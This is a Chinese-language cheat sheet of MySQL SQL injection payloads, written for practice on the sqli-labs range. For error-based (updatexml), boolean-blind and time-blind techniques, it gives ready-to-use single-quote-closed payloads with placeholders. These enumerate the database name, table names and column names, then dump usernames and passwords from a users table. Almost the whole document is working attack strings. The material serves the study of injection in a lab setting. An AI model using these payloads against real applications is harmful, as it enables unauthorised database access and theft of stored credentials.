##### information_schema数据库
##### 注：以下测试都是基于sqli-labs的靶场测试
- tables表
  - table_schema：目标数据库
  - table_name：目标表名称
- columns表
  - table_schema：目标数据库
  - table_name：目标表

注：以下方式按照**单引号闭合**给出示例，具体成功与否需要结合实际环境测试

##### 首先查询数据库的长度

```
单引号闭合注入语句
报错注入：
1' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1
布尔盲注（写脚本枚举）：
1' and length(database())=8 and '1'='1
时间盲注（写脚本枚举）：
1' and if(length(database())=8,sleep(1),1) and '1'='1
```

##### 遍历数据库字符串

```
报错注入：
1' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1
布尔盲注（写脚本枚举）：
1' and substr(database(),1,1)='s' and '1'='1
时间盲注（写脚本枚举）：
1' and if(substr(database(),1,1)='s',sleep(1),1) and '1'='1
```

##### 爆表

```
爆表的长度：
语句：SELECT CHAR_LENGTH(group_concat(table_name))
FROM information_schema.tables
WHERE table_schema='security';

payload太长了，用str_foo作为占位符，int_foo作为枚举的占位符

枚举表的长度
str_foo = (SELECT CHAR_LENGTH(group_concat(table_name)) FROM information_schema.tables WHERE table_schema='security')

报错注入：
1' and updatexml(1,concat(0x7e,str_foo,0x7e),1) and '1'='1
布尔注入： 
1' and str_foo=int_foo and '1'='1
时间注入：
1' and if(length(str_foo)=int_foo,sleep(1),1) and '1'='1

int_foo=猜测长度的数字
```

```
爆表
语句：SELECT table_name from information_schema.tables where table_schema='security'

str_foo = (SELECT group_concat(table_name) from information_schema.tables where table_schema='security')

报错注入：
1' and updatexml(1,concat(0x7e,str_foo,0x7e),1) and '1'='1
布尔注入： 
1' and substr(str_foo,int_foo,1)='char_foo' and '1'='1
时间注入：
1' and if(substr(str_foo,int_foo,1)='char_foo',sleep(1),1) and '1'='1

char_foo，int_foo两次循环
int_foo：str_foo的第int_foo个字符
char_foo：猜的字符
```

##### 爆字段

```
爆某表所有字段的长度：
语句：select CHAR_LENGTH(group_concat(COLUMN_NAME)) from information_schema.columns where table_name = 'users' and table_schema = 'security'

payload太长了，用str_foo作为占位符，int_foo作为枚举的占位符

枚举字段的长度
str_foo = (select CHAR_LENGTH(group_concat(COLUMN_NAME)) from information_schema.columns where table_name = 'users' and table_schema = 'security')

报错注入：
1' and updatexml(1,concat(0x7e,str_foo,0x7e),1) and '1'='1
布尔注入： 
1' and str_foo=int_foo and '1'='1
时间注入：
1' and if(length(str_foo)=int_foo,sleep(1),1) and '1'='1

int_foo=猜测长度的数字
```

```
爆字段
语句：select group_concat(COLUMN_NAME) from information_schema.columns where table_name = 'users' and table_schema = 'security'

str_foo = (select group_concat(COLUMN_NAME) from information_schema.columns where table_name = 'users' and table_schema = 'security')

报错注入：
1' and updatexml(1,concat(0x7e,str_foo,0x7e),1) and '1'='1
布尔注入： 
1' and substr(str_foo,int_foo,1)='char_foo' and '1'='1
时间注入：
1' and if(substr(str_foo,int_foo,1)='char_foo',sleep(1),1) and '1'='1

char_foo，int_foo两次循环
int_foo：str_foo的第int_foo个字符
char_foo：猜的字符
```

##### 爆数据

```
语句：SELECT GROUP_CONCAT(CONCAT(username, ',', password),'/') FROM security.users

str_foo = (SELECT GROUP_CONCAT(CONCAT(username, ',', password),'/') FROM security.users)

报错注入：
1' and updatexml(1,concat(0x7e,str_foo,0x7e),1) and '1'='1
布尔注入： 
1' and substr(str_foo,int_foo,1)='char_foo' and '1'='1
时间注入：
1' and if(substr(str_foo,int_foo,1)='char_foo',sleep(1),1) and '1'='1

char_foo，int_foo两次循环
int_foo：str_foo的第int_foo个字符
char_foo：猜的字符
```

##### 注：以上工具思路是将payload和具体注入查询的语句分开，以便于payload探测，和在确定具体的闭合方式之后，只改变占位符来攻击具体的数据
